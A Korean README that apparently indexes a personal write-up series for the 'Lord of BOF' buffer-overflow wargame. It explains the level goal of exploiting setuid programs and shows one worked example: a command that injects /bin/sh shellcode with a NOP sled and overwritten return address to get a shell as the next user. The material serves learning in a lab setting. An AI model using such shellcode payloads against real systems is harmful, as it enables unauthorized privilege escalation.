# The Lord of BOF (일명 LOB)

[[공지] BOF 원정대 서비스를 오픈합니다.](http://www.hackerschool.org/HS_Boards/zboard.php?id=HS_Notice&no=1170881885)

> [BOF-BufferOverflow- 원정대란?]
>
> 비교적 쉬운 BOF 공략 환경인 Redhat 6.2에서부터 궁극의 Fedora 14까지 
>
> 수십개의 레벨을 거쳐가며 BOF 시스템 해킹 실습을 하는 War-Game입니다.

시스템 해킹 쪽 워게임을 처음 풀어봐서 처음 접하는게 많았습니다. 그동안 보안을 공부하면서 왜 이런걸 안했을까 생각도 들었구요... 최대한 풀면서 배운 내용을 나의 것으로 만들려고 노력했습니다. 문제를 풀 때 필요했던 배경지식은 따로 문서를 작성하려고 합니다.

## Levels

- [Level 00, Environment Setting](https://github.com/CXBT/Writeup/blob/master/Wargame/The%20Lord%20of%20BOF/00SETTING.md)
- [Level 01, Gate -> Gremlin](https://github.com/CXBT/Writeup/blob/master/Wargame/The%20Lord%20of%20BOF/01GATE.md)
- [Level 02, Gremlin -> Cobolt](https://github.com/CXBT/Writeup/blob/master/Wargame/The%20Lord%20of%20BOF/02GREMLIN.md)
- [Level 03, Cobolt -> Goblin](https://github.com/CXBT/Writeup/blob/master/Wargame/The%20Lord%20of%20BOF/03COBOLT.md)
- [Level 04, Goblin -> Orc](https://github.com/CXBT/Writeup/blob/master/Wargame/The%20Lord%20of%20BOF/04GOBLIN.md)
- [Level 05, Orc -> Wolfman](https://github.com/CXBT/Writeup/blob/master/Wargame/The%20Lord%20of%20BOF/05ORC.md)
- [Level 06, Wolfman -> Darkelf](https://github.com/CXBT/Writeup/blob/master/Wargame/The%20Lord%20of%20BOF/06WOLFMAN.md)
- [Level 07, Darkelf -> Orge](https://github.com/CXBT/Writeup/blob/master/Wargame/The%20Lord%20of%20BOF/07DARKELF.md)
- [Level 08, Orge -> Troll](https://github.com/CXBT/Writeup/blob/master/Wargame/The%20Lord%20of%20BOF/08ORGE.md)
- [Level 09, Troll -> Vampire](https://github.com/CXBT/Writeup/blob/master/Wargame/The%20Lord%20of%20BOF/09TROLL.md)
- [Level 10, Vampire -> Skeleton](https://github.com/CXBT/Writeup/blob/master/Wargame/The%20Lord%20of%20BOF/10VAMPIRE.md)
- [Level 11, Skeleton -> Golem](https://github.com/CXBT/Writeup/blob/master/Wargame/The%20Lord%20of%20BOF/11SKELETON.md)
- [Level 12, Golem -> Darkknight](https://github.com/CXBT/Writeup/blob/master/Wargame/The%20Lord%20of%20BOF/12GOLEM.md)
- [Level 13, Darkknight -> Bugbear](https://github.com/CXBT/Writeup/blob/master/Wargame/The%20Lord%20of%20BOF/13DARKKNIGHT.md)
- [Level 14, Bugbear -> Giant](https://github.com/CXBT/Writeup/blob/master/Wargame/The%20Lord%20of%20BOF/14BUGBEAR.md)
- [Level 15, Giant -> Assassin](https://github.com/CXBT/Writeup/blob/master/Wargame/The%20Lord%20of%20BOF/15GIANT.md)
- [Level 16, Assassin -> Zombie](https://github.com/CXBT/Writeup/blob/master/Wargame/The%20Lord%20of%20BOF/16ASSASSIN.md)
- [Level 17, Zombie -> Succubus](https://github.com/CXBT/Writeup/blob/master/Wargame/The%20Lord%20of%20BOF/17ZOMBIE.md)
- [Level 18, Succubus -> Nightmare](https://github.com/CXBT/Writeup/blob/master/Wargame/The%20Lord%20of%20BOF/18SUCCUBUS.md)
- [Level 19, Nightmare -> Xavius](https://github.com/CXBT/Writeup/blob/master/Wargame/The%20Lord%20of%20BOF/19NIGHTMARE.md)
- [Level 20, Xavius -> Death_knight](https://github.com/CXBT/Writeup/blob/master/Wargame/The%20Lord%20of%20BOF/20XAVIUS.md)  <- I'm right here
- [Level 21, Death_knight]()

## 문제 풀이 방법

각 계정에는 다음 단계를 의미하는 계정의 `Setuid`가 걸린 프로그램이 있습니다. 간단히 말하자면 `Setuid`가 걸린 프로그램을 어떻게든 이용해 다음 단계 계정의 비밀번호를 알아내 다음 단계로 진행해서 20단계, `Death_knight`까지 진행하면 됩니다.

```sh
[gate@localhost gate]$ id
uid=500(gate) gid=500(gate) groups=500(gate)
[gate@localhost gate]$ ll
total 16
-rwsr-sr-x    1 gremlin  gremlin     11987 Feb 26  2010 gremlin
-rw-rw-r--    1 gate     gate          272 Mar 29  2010 gremlin.c
```

다음 예시는 `gate` 계정으로 로그인해 `id`와 `ll`로 홈 디렉토리를 본 상황입니다. 홈 디렉토리를 보면 `gremlin`이라고 하는 `gremlin` 계정의 `SetGID`와 `SetUID` 권한을 가진 프로그램이 있습니다. 저 프로그램을 BOF로 마음대로 다뤄서 gremlin의 비밀번호를 알아오는 것이 각 단계의 목표입니다.

LOB 환경은 `my-pass`라는 현재 계정의 비밀번호를 출력하는 명령어를 지원합니다. 만약 계정에 접근하게 되었다면 `my-pass`로 비밀번호를 알아내 다음 단계 계정으로 로그인해 진행하는 방식입니다.

```sh
[gate@localhost gate]$ ./gremlin `python -c "print '\x90'*200+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'+'\x90'*36+'\x68\xf9\xff\xbf'"`
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒ᙰ
                                                           ̀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒h▒▒▒
bash$ id
uid=500(gate) gid=500(gate) euid=501(gremlin) egid=501(gremlin) groups=500(gate)
bash$ my-pass
euid = 501
hello bof world
```

위 예시는 `gremlin` 프로그램에 `/bin/sh`을 실행시키는 쉘코드를 주입하고 BOF를 이용해 실행흐름을 조작해서 쉘코드를 실행시킨 상황입니다. 이 프로그램은 `gremlin` 계정의 `SetUID` 권한을 가지고 있기 때문에 쉘코드 내부에서 `/bin/sh`을 실행시킬때 `gremlin` 계정으로 실행시키게 됩니다. 그래서 `my-pass` 명령어를 치면 `gremlin` 계정의 비밀번호가 나오게 되는 것입니다. 위 예시 처럼 각 단계에 있는 `SetUID`가 걸린 프로그램을 이용해 다음 단계 계정의 비밀번호를 알아가면 됩니다.

## 문서 양식

Writeup은 다음과 같은 항목으로 구성했습니다:

- 문제 소스
- 분석
  - 문제 파일 디스어셈블 코드
  - 예상되는 스택 구조
  - 관찰한 스택 구조
- Exploit
  - 공격 방법론
  - 쉘코드
  - 페이로드 구조
- 결과

## 다양한 배경지식

문제풀면서 새로 배운 것들도 문서화를 시켜야 겠네요 :smile: